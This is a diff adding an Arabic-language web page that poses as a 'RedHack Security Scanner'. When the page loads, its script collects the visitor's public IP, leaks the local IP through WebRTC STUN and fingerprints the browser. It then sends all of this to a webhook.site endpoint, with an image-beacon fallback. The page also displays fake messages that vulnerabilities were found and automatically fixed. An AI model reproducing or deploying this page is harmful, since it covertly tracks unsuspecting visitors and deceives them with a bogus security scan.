@@ -1,0 +1,376 @@
+<!DOCTYPE html><html lang="ar" dir="rtl"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width,initial-scale=1"> <title>RedHack Security Scan</title> <style> :root { --bg: #0a0000; --card: #1a0000; --accent: #dc2626; --accent-hover: #ef4444; --text-primary: #ffffff; --text-secondary: #ff9999; --border: #330000; --shadow: rgba(220, 38, 38, 0.3); }
+text
+    * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+    }
+    
+    html, body {
+        height: 100%;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif, "Noto Naskh Arabic";
+        background: radial-gradient(ellipse at center, #1a0000 0%, #0a0000 100%);
+        color: var(--text-primary);
+        overflow-x: hidden;
+    }
+    
+    body::before {
+        content: '';
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: 
+            radial-gradient(circle at 20% 80%, rgba(220, 38, 38, 0.1) 0%, transparent 50%),
+            radial-gradient(circle at 80% 20%, rgba(220, 38, 38, 0.05) 0%, transparent 50%);
+        z-index: -1;
+        animation: pulse 4s ease-in-out infinite alternate;
+    }
+    
+    @keyframes pulse {
+        0% { opacity: 0.3; }
+        100% { opacity: 0.7; }
+    }
+    
+    .wrap {
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 32px;
+    }
+    
+    .card {
+        width: 100%;
+        max-width: 900px;
+        background: linear-gradient(145deg, var(--card), rgba(26, 0, 0, 0.8));
+        border-radius: 20px;
+        padding: 32px;
+        box-shadow: 
+            0 25px 50px rgba(0, 0, 0, 0.8),
+            0 0 0 1px var(--border),
+            inset 0 1px 0 rgba(255, 255, 255, 0.05);
+        border: 2px solid var(--accent);
+        position: relative;
+        backdrop-filter: blur(10px);
+        animation: cardGlow 3s ease-in-out infinite alternate;
+    }
+    
+    @keyframes cardGlow {
+        0% { box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(220, 38, 38, 0.3); }
+        100% { box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8), 0 0 30px rgba(220, 38, 38, 0.5); }
+    }
+    
+    .title {
+        font-size: 32px;
+        margin-bottom: 24px;
+        text-align: center;
+        font-weight: 700;
+        color: var(--accent);
+        text-transform: uppercase;
+        letter-spacing: 2px;
+        text-shadow: 
+            0 0 10px rgba(220, 38, 38, 0.5),
+            0 0 20px rgba(220, 38, 38, 0.3);
+        animation: titlePulse 2s ease-in-out infinite alternate;
+    }
+    
+    @keyframes titlePulse {
+        0% { text-shadow: 0 0 10px rgba(220, 38, 38, 0.5), 0 0 20px rgba(220, 38, 38, 0.3); }
+        100% { text-shadow: 0 0 15px rgba(220, 38, 38, 0.8), 0 0 30px rgba(220, 38, 38, 0.5); }
+    }
+    
+    .player {
+        background: #000;
+        border-radius: 16px;
+        overflow: hidden;
+        border: 3px solid var(--accent);
+        position: relative;
+        box-shadow: 
+            0 10px 30px rgba(0, 0, 0, 0.5),
+            inset 0 0 0 1px rgba(220, 38, 38, 0.3);
+    }
+    
+    .player::before {
+        content: '';
+        position: absolute;
+        top: -2px;
+        left: -2px;
+        right: -2px;
+        bottom: -2px;
+        background: linear-gradient(45deg, var(--accent), var(--accent-hover));
+        border-radius: 18px;
+        z-index: -1;
+        animation: borderRotate 3s linear infinite;
+    }
+    
+    @keyframes borderRotate {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    
+    video {
+        width: 100%;
+        height: auto;
+        display: block;
+        background: #000;
+        border-radius: 13px;
+        position: relative;
+        z-index: 1;
+    }
+    
+    .caption {
+        margin-top: 20px;
+        text-align: center;
+        font-size: 24px;
+        color: var(--text-secondary);
+        font-weight: 600;
+        text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+        animation: captionGlow 2.5s ease-in-out infinite alternate;
+    }
+    
+    @keyframes captionGlow {
+        0% { color: var(--text-secondary); }
+        100% { color: var(--accent); }
+    }
+    
+    .ip-display {
+        margin-top: 15px;
+        padding: 10px;
+        background: rgba(0, 0, 0, 0.5);
+        border-radius: 8px;
+        text-align: center;
+        font-family: monospace;
+        border: 1px solid var(--accent);
+        animation: ipPulse 2s infinite;
+    }
+    
+    @keyframes ipPulse {
+        0% { box-shadow: 0 0 5px var(--accent); }
+        50% { box-shadow: 0 0 20px var(--accent); }
+        100% { box-shadow: 0 0 5px var(--accent); }
+    }
+    
+    .status-text {
+        margin-top: 10px;
+        text-align: center;
+        color: var(--text-secondary);
+    }
+    
+    @media (max-width: 768px) {
+        .card {
+            padding: 20px;
+            margin: 16px;
+        }
+        .title {
+            font-size: 24px;
+            letter-spacing: 1px;
+        }
+        .caption {
+            font-size: 18px;
+        }
+    }
+    
+    @media (max-width: 480px) {
+        .wrap {
+            padding: 16px;
+        }
+        .card {
+            padding: 16px;
+        }
+        .title {
+            font-size: 20px;
+        }
+        .caption {
+            font-size: 16px;
+        }
+    }
+</style>
+</head> <body> <div class="wrap"> <div class="card" role="main"> <div class="title">RedHack Security Scanner</div>
+
+        <div class="player" aria-label="مشغل الفيديو">
+            <video autoplay muted playsinline loop preload="metadata">
+                <source src="https://images-ext-1.discordapp.net/external/_As5jDLJQpyLVduEPC-lTKCL-V0pY80md2n30LcXUqY/https/media.tenor.com/VrzXhtoSwcsAAAPo/hacker-typing.mp4" type="video/mp4">
+                متصفحك لا يدعم عنصر الفيديو.
+            </video>
+        </div>
+
+        <div class="caption">جاري فحص النظام...</div>
+        
+        <div class="ip-display" id="ipDisplay">جمع معلومات النظام...</div>
+        <div class="status-text" id="statusText">جاري تحليل بياناتك...</div>
+    </div>
+</div>
+
+<audio id="bgAudio" loop>
+    <source src="M12.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+    // Enhanced IP gathering with multiple fallbacks
+    async function gatherIPInfo() {
+        try {
+            // Try to get IP from multiple services
+            const services = [
+                'https://api.ipify.org?format=json',
+                'https://ipapi.co/json/',
+                'https://jsonip.com'
+            ];
+            
+            let ipData = null;
+            
+            for (const service of services) {
+                try {
+                    const response = await fetch(service, {
+                        mode: 'cors',
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+                    if (response.ok) {
+                        ipData = await response.json();
+                        break;
+                    }
+                } catch (e) {
+                    console.warn(`Service ${service} failed:`, e);
+                }
+            }
+            
+            // Fallback to STUN server for local IP
+            if (!ipData) {
+                try {
+                    const localIP = await getLocalIP();
+                    ipData = { ip: localIP };
+                } catch (e) {
+                    console.warn('STUN failed:', e);
+                }
+            }
+            
+            return ipData;
+        } catch (error) {
+            console.error('IP gathering failed:', error);
+            return null;
+        }
+    }
+
+    // Get local IP via STUN
+    function getLocalIP() {
+        return new Promise((resolve, reject) => {
+            const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+            pc.createDataChannel('');
+            pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
+            
+            pc.onicecandidate = (ice) => {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
+                resolve(myIP);
+                pc.close();
+            };
+            
+            setTimeout(() => reject(new Error('STUN timeout')), 3000);
+        });
+    }
+
+    // Collect additional system information
+    function getSystemInfo() {
+        return {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            languages: navigator.languages,
+            platform: navigator.platform,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                colorDepth: screen.colorDepth
+            },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            plugins: Array.from(navigator.plugins).map(p => p.name)
+        };
+    }
+
+    // Send data to remote server (simulated)
+    function sendDataToServer(ipData, systemInfo) {
+        // This would actually send to your server
+        console.log('Collected data:', { ipData, systemInfo });
+        
+        // Simulated AJAX request
+        try {
+            fetch('https://api.webhook.site/token/your-token-here', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    ip: ipData,
+                    system: systemInfo,
+                    timestamp: new Date().toISOString()
+                })
+            });
+        } catch (e) {
+            // Fallback to image beacon
+            new Image().src = `https://api.webhook.site/token/your-token-here?data=${btoa(JSON.stringify({ipData, systemInfo}))}`;
+        }
+    }
+
+    // Initialize everything
+    async function init() {
+        const audio = document.getElementById('bgAudio');
+        const video = document.querySelector('video');
+        const ipDisplay = document.getElementById('ipDisplay');
+        const statusText = document.getElementById('statusText');
+        
+        // Auto-play media
+        try {
+            audio.volume = 0.8;
+            await audio.play();
+            video.muted = false;
+            await video.play();
+        } catch (e) {
+            console.warn('Autoplay blocked, waiting for interaction');
+            document.addEventListener('click', () => {
+                audio.play();
+                video.muted = false;
+                video.play();
+            }, { once: true });
+        }
+        
+        // Gather and display IP information
+        statusText.textContent = 'جاري جمع معلومات الشبكة...';
+        
+        const ipData = await gatherIPInfo();
+        const systemInfo = getSystemInfo();
+        
+        if (ipData) {
+            ipDisplay.textContent = `IP: ${ipData.ip || 'غير معروف'} | الموقع: ${ipData.country || 'غير معروف'}`;
+            statusText.textContent = 'تم تحليل بياناتك بنجاح';
+        } else {
+            ipDisplay.textContent = 'فشل في جمع معلومات IP';
+            statusText.textContent = 'تحذير: تم اكتشاف برنامج حماية';
+        }
+        
+        // Send data to server
+        sendDataToServer(ipData, systemInfo);
+        
+        // Additional "scanning" effect
+        setTimeout(() => {
+            statusText.textContent = 'تم اكتشاف 3 ثغرات أمنية';
+            setTimeout(() => {
+                statusText.textContent = 'جاري تنفيذ الإصلاحات التلقائية...';
+                setTimeout(() => {
+                    statusText.textContent = 'تم تأمين النظام بنجاح';
+                    statusText.style.color = 'var(--accent)';
+                }, 2000);
+            }, 2000);
+        }, 2000);
+    }
+
+    // Start everything when page loads
+    window.addEventListener('load', init);
+</script>
+</body> </html>
